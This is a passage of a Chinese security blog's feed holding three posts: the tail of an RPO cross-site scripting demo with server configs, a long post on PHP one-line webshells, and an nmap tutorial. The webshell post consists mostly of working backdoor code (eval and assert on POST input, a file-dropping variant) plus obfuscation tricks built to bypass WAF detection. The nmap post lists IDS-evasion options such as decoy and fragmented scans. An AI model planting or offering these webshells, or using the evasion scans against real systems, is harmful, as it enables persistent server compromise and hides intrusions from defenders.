<li>apache要开启pathinfo模式:</li>
</ul>
<pre><code>&lt;Directory /&gt;
Options +Indexes +FollowSymLinks +ExecCGI
AllowOverride All
Order allow,deny
Allow from all
#AcceptPathInfo on   #增加这行配置
Require all granted
&lt;/Directory&gt;
</code></pre>
<ul>
<li>nginx增加pathinfo模式配置:</li>
</ul>
<pre><code>server {
        listen       80;
        server_name  localhost;
        root   &quot;D:/good&quot;;
        location / {
           index  index.html index.htm index.php;
           autoindex  off;
           if (!-e $request_filename) {
              rewrite ^/(.*)  /index.php/$1 last;
            } 
        }
        
        location ~ \.php(.*)$  {
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;
            fastcgi_param  SCRIPT_FILENAME       $document_root$fastcgi_script_name;
            fastcgi_param  PATH_INFO  $fastcgi_path_info;
            fastcgi_param  PATH_TRANSLATED      $document_root$fastcgi_path_info;
            include        fastcgi_params;
        }
     }
</code></pre>
<p>这里我们配置好开启pathinfo模式的apache服务器，测试一下<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/123.png" alt="" loading="lazy"><br>
创建一个test.php和一个内容alert('QAQ')的1.html文件</p>
<pre><code>//test.php内容：
&lt;html&gt;
    &lt;head&gt;RPO attack test&lt;/head&gt;
    &lt;body&gt;
        &lt;script src=&quot;1.js&quot;&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
if($_GET['page'])
{
    $a=$_GET['page'];
    Header('Location:http://127.0.0.1/rpotest/test/'.&quot;$a&quot;.'.html');
}
?&gt;
</code></pre>
<p>然后访问：http://127.0.0.1/rpotest/test.php/page/1/..%2f..%2f..%2ftest.php<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rpoxss.png" alt="" loading="lazy"><br>
我们会发现竟然将1.html没有标签的纯文本内容当作javascript语句执行，这是因为和上述一样当浏览器解析到..%2f..%2f..%2ftest.php时把这一堆当作一个文件，然后加载是的http://127.0.0.1/rpotest/test.php/page/1/1.js,而且test.php里面写的请求是<script src="1.js"></script>，所以返回的内容(1.html)会被当成js解析，所以造成了弹框现象。</p>
<h2 id="漏洞防护">漏洞防护</h2>
<p>在页面中避免直接使用相对路径进行静态文件的加载。</p>
<h2 id="总结">总结</h2>
<p>在实际场景中可能需要网站有可控的未声明的<!DOCTYPE html>输出点，并且使用相对路径的js、css加载方式或者开启pathinfo模式；但如果细心的研究这些利用技巧的话，可能会有意想不到的收获！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHP一句话分析]]></title>
        <id>https://0kccc.github.io/post/php-yi-ju-hua-fen-xi/</id>
        <link href="https://0kccc.github.io/post/php-yi-ju-hua-fen-xi/">
        </link>
        <updated>2020-11-18T06:14:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="webshell含义">Webshell含义</h1>
<p>webshell 就是以网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。顾名思义，web的含义是显然需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。<br>
一句话木马、小马、大马都可以叫 webshell。</p>
<pre><code>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。
</code></pre>
<h2 id="一句话木马原理php">一句话木马原理（PHP）</h2>
<p>一句话木马的原理是利用了PHP中的eval()。注：eval是因为是一个语言构造器而不是一个函数。</p>
<pre><code>1）PHP eval() 把字符串按照 PHP 代码来计算。
2）该字符串必须是合法的 PHP 代码，且必须以分号结尾。
3）如果没有在代码字符串中调用return语句，则返回NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
</code></pre>
<p>主要会使用到函数及说明（<a href="https://www.php.net/manual/zh/">PHP手册</a>）：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>eval</td>
<td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td>
</tr>
<tr>
<td>assert</td>
<td>PHP 4, PHP 5,PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td>
</tr>
<tr>
<td>正则匹配类</td>
<td>preg_replace/ mb_ereg_replace/preg_filter等</td>
</tr>
<tr>
<td>文件包含类</td>
<td>include/include_once/require/require_once/file_get_contents等</td>
</tr>
</tbody>
</table>
<p>基本的一句话木马：</p>
<pre><code>&lt;?php
@eval($_POST[a]);
?&gt;

注：@是忽略可能出现的错误,建议使用eval、assert时都加上
</code></pre>
<h2 id="一句话绕过">一句话绕过：</h2>
<h3 id="1特殊函数写webshell">1.特殊函数写webshell</h3>
<ul>
<li>call_user_func 回调函数</li>
</ul>
<p><strong>call_user_func</strong> 这个函数可以调用其它函数，被调用的函数是 call_user_func 的第一个函数，被调用的函数的参数是call_user_func的第二个参数。这样的一个语句也可以完成一句话木马。一些被waf拦截的木马可以配合这个函数绕过waf。<strong>call_user_func + assert 构造的一句话木马在 php 7.0 版本及以下可以使用</strong>(<em>注：在php&gt;=7.2版本后，禁用给assert()函数传入字符串参数，因为通过超全局常量$_GET['']获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。但是直接assert(phpinfo())传入的参数是函数，所以就不会触发函数禁用，可以正常回显。</em>)</p>
<pre><code>&lt;?php
@call_user_func(assert,$_POST['a']);
?&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720201118142707.png" alt="" loading="lazy"></figure>
<pre><code>&lt;?php
@call_user_func(assert,phpinfo());
?&gt;
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/2.png" alt="image" loading="lazy"><br>
(这里call_user_func函数不能调用eval，因为eval是一个语言构造器而不是一个函数，不能被可变函数调用。call_user_func有两个参数，第一个参数要求是函数，而eval只是一个语言构造器而不是函数，所以不符合call_user_func的语法，调用eval就会报错。)</p>
<ul>
<li>preg_replace_callback()函数</li>
</ul>
<pre><code>&lt;?php
preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);
?&gt;
</code></pre>
<p>原理：通过create_function“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>
<ul>
<li>file_put_contents 函数</li>
</ul>
<pre><code>&lt;?php
$test='&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;';
file_put_contents(&quot;muma.php&quot;, $test);
?&gt;
</code></pre>
<p>这里利用函数生成muma.php木马文件。此木马文件的内容是<strong>file_put_contents函数</strong>(生成一个文件,第一个参数是文件名，第二个参数是文件的内容。)</p>
<h3 id="2bypass-waf">2.bypass WAF</h3>
<p>WAF 通常以关键字判断是否为一句话木马，但是可以通过对一句话木马的变形，动态调用，隐藏或者替换关键字，达到绕过WAF的目的。所以想要绕过 WAF，就需要掌握各种 PHP 小技巧，掌握的技巧多了，把技巧结合起来，才可以设计出符合当时环境的一句话木马。</p>
<ul>
<li>PHP变量函数</li>
</ul>
<pre><code>&lt;?php 
$a = &quot;eval&quot;;
$a(@$_POST['a']); 
?&gt;
</code></pre>
<ul>
<li>str_replace()函数<br>
函数功能：在第三个参数中，查找第一个参数，并替换成第二个参数。这里第二个参数为空字符串，就相当于删除&quot;Waldo&quot;。</li>
</ul>
<pre><code>&lt;?php
$a=str_replace(&quot;Waldo&quot;, &quot;&quot;, &quot;eWaldoval&quot;);
$a(@$_POST['a']);
?&gt;
</code></pre>
<ul>
<li>base64_decode()函数</li>
</ul>
<pre><code>&lt;?php
$a=base64_decode(&quot;ZXZhbA==&quot;);   //ZXZhbA== 是eval的base64加密
$a($_POST['a']);
?&gt;
</code></pre>
<ul>
<li>&quot;.&quot;操作符</li>
</ul>
<pre><code>//&quot;.&quot;并置操作符，连接两个及以上字符串；例如a=&quot;li&quot;,b=&quot;hua&quot;,c=a.b即c=lihua
&lt;?php
$a=&quot;e&quot;.&quot;v&quot;;
$b=&quot;a&quot;.&quot;l&quot;;
$c=$a.$b;
$c($_POST['a']);
?&gt;
</code></pre>
<ul>
<li>parse_str()函数</li>
</ul>
<pre><code>&lt;?php
$str=&quot;a=eval&quot;;
parse_str($str);  //生成一个变量$a，值为字符串&quot;eval&quot;
$a($_POST['a']);
?&gt;
</code></pre>
<ul>
<li>strtr()函数<br>
strtr(string,from,to)</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td>必需。规定要转换的字符串。</td>
</tr>
<tr>
<td>from</td>
<td>必需（除非使用数组）。规定要改变的字符。</td>
</tr>
<tr>
<td>to</td>
<td>必需（除非使用数组）。规定要改变为的字符。</td>
</tr>
<tr>
<td>array</td>
<td>必需（除非使用from和to）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。</td>
</tr>
</tbody>
</table>
<pre><code>&lt;?php 
    $a = strtr('atestt','test','sser');
    $a($_POST['x']);
?&gt;
</code></pre>
<ul>
<li>异或操作<br>
在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。(PHP5)</li>
</ul>
<pre><code>&lt;?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');   // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');   // $__='_POST';
$___=$$__;
$_($___[_]);   // assert($_POST[_]);
?&gt;
</code></pre>
<ul>
<li>取反操作<br>
利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是&quot;\x8c&quot;，其取反即为字母s。利用这个特性就可以找些汉字来构造出assert。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/233.png" alt="" loading="lazy"></li>
</ul>
<pre><code>&lt;?php
$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');
$_=$__/$__;

$____='';
$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});

$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);
?&gt;
</code></pre>
<h3 id="困境">困境：</h3>
<p>php7之后我们已经不能使用强大的assert函数了,waf只要把函数封死就可以有效的阻止webshell免杀,而eval并没有assert那么灵活。后期⼤家可能更加倾向使用大马。</p>
<h2 id="参考">参考：</h2>
<p><a href="https://xz.aliyun.com/t/3924">php一句话绕过技术分析</a><br>
<a href="http://blog.leanote.com/post/snowming/2e1ab18dfa80">一句话木马分析</a><br>
<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html#%22%3Ehttps://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">PHP回调后门</a><br>
<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#">无数字和字母的webshell</a><br>
<a href="https://xz.aliyun.com/t/5152">对于php免杀webshell的一些总结</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[nmap使用详解]]></title>
        <id>https://0kccc.github.io/post/nmap-shi-yong-xiang-jie/</id>
        <link href="https://0kccc.github.io/post/nmap-shi-yong-xiang-jie/">
        </link>
        <updated>2020-11-06T02:13:06.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://0kccc.github.io/post-images/1604629436980.png" alt="" loading="lazy"></figure>
<h1 id="简单使用">简单使用：</h1>
<ul>
<li>扫描对外开放服务：nmap domain/ip<br>
<img src="https://0kccc.github.io/post-images/1604629443108.png" alt="" loading="lazy"></li>
<li>扫描指定端口： nmap -p 端口 ip<br>
<img src="https://0kccc.github.io/post-images/1604629450062.png" alt="" loading="lazy"></li>
</ul>
<pre><code>nmap -p 80 192.168.50.1
nmap -p 80,8081 192.168.50.1-253
还可以自定义端口参数：
-p端口范围：只扫描指定的端口。扫描1-1024号端口，可设定该选项为–p 1-1024。扫描1 〜65535端口时，可使用-p-选项。
-F（快速扫描）：将仅扫描100	个常用端口。
-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。
</code></pre>
<h1 id="进阶使用">进阶使用：</h1>
<ul>
<li>nmap的6种端口状态：</li>
</ul>
<pre><code>开放：工作于开放端口的服务器端的应用程序可以受理TCP连接、接收UDP数据包或者响 应SCTP（流控制传输协议）请求。
关闭：虽然我们确实可以访问有关的端口，但是没有应用程序工作于该端口上。
过滤：Nmap不能确定该端口是否开放。包过滤设备屏蔽了我们向目标发送的探测包。
未过滤：虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。 
打开｜过滤：Nmap认为指定端口处于开放状态或过滤状态，但是不能确定处于两者之中的 哪种状态。在遇到没有响应的开放端口时，Nmap会作出这种判断。这可以是由于防火墙丢 弃数据包造成的。
关闭｜过滤：Nmap认为指定端口处于关闭状态或过滤状态，但是不能确定处于两者之中的 哪种状态。
</code></pre>
<h2 id="常用参数">常用参数：</h2>
<ul>
<li>-sV(服务版本识别)<br>
<img src="https://0kccc.github.io/post-images/1604629468191.png" alt="" loading="lazy"></li>
<li>-O(操作系统检测)<br>
<img src="https://0kccc.github.io/post-images/1604629472695.png" alt="" loading="lazy"></li>
<li>-A(全面扫描)，包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测；耗时较长。</li>
<li>-Pn(禁用主机检测)，如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机，就需要禁用Nmap的主机检测功能，也可跳过防火墙。</li>
<li>-vv(输出结果)，对扫描结果进行详细的输出。</li>
</ul>
<h1 id="深入使用了解一下">深入使用(了解一下):</h1>
<ul>
<li>TCP扫描：</li>
</ul>
<pre><code>1.TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三 次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来。如果启动 Nmap的用户的权限不足，那么默认情况下Nmap程序将以这种模式进行扫描。
2.SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式。如果启动Nmap 的用户有高级别权限，那么在默认情况下Nmap程序将以这种模式进行扫描。
3.TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。
4.TCP Maimon扫描（-sM）：Uriel Maimon 首先发现了TCP Maimom扫描方式。这种模式的 探测数据包含有FIN/ACK标识。对于BSD衍生出来的各种操作系统来说，如果被测端口处于 开放状态，主机将会丢弃这种探测数据包；如果被测端口处于关闭状态，那么主机将会回复 RST。
5.TCPACK扫描（-sA）：这种扫描模式可以检测目标系统是否采用了数据包状态监测技术 （stateful）防火墙，并能确定哪些端口被防火墙屏蔽。这种类型的数据包只有一个ACK标识 位。如果目标主机的回复中含有RST标识，则说明目标主机没有被过滤。
6.TCP窗口扫描（-sW）：这种扫描方式检测目标返回的RST数据包的TCP窗口字段。如果目 标端口处于开放状态，这个字段的值将是正值；否则它的值应当是0。
7.TCP Idle扫描（-sI）：采用这种技术后，您将通过指定的僵尸主机发送扫描数据包。本机 并不与目标主机直接通信。如果对方网络里有IDS，IDS将认为发起扫描的主机是僵尸主机。
</code></pre>
<ul>
<li>UDP扫描选项：</li>
</ul>
<pre><code>Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。
优化方法：
1.进行并发的UDP扫描；
2.优先扫描常用端口；
3.在防火墙后面扫描；
4.启用--host-timeout选项以跳过响应过慢的主机。
</code></pre>
<ul>
<li>规避主机检测：</li>
</ul>
<pre><code>如果目标主机通常处于防火墙或IDS系统的保护内，使用Nmap的默认选项进行扫描，可能会被发现并且扫不出任何结果。所以，我们可以使用Nmap自带的绕过检测参数。
-f（使用小数据包）：这个选项可避免对方识别出我们探测的数据包。指定这个选项之后，Nmap将使用8字节甚至更小数据体的数据包。
--mtu：这个选项用来调整数据包的包大小。MTU（Maximum	Transmission Unit，最大传输单元）必须是8的整数倍，否则Nmap将报错。
-D（诱饵）：这个选项应指定假IP(诱饵的IP)。启用这个选项之后，Nmap在发送侦测数据包的时候会掺杂一些源地址是假IP（诱饵）的数据包。这种功能意在以藏木于林的方法 掩盖本机的真实	IP。也就是说，对方的log还会记录下本机的真实IP。您可使用RND生成随机 的假IP地址，或者用RND：number的参数生成&lt;number&gt;个假IP地址。您所指定的诱饵主机 应当在线，否则很容易击溃目标主机。另外，使用了过多的诱饵可能造成网络拥堵。尤其是 在扫描客户的网络的时候，您应当极力避免上述情况。
--source-port &lt;portnumber&gt;或-g（模拟源端口）：如果防火墙只允许某些源端口的入站流量，这个选项就非常有用。
--data-length：这个选项用于改变Nmap	发送数据包的默认数据长度，以避免被识别出来是Nmap的扫描数据。
--max-parallelism：这个选项可限制Nmap并发扫描的最大连接数。
--scan-delay &lt;time&gt;：这个选项用于控制发送探测数据的时间间隔，以避免达到IDS/IPS端口扫描规则的阈值。
</code></pre>
]]></content>
    </entry>
</feed>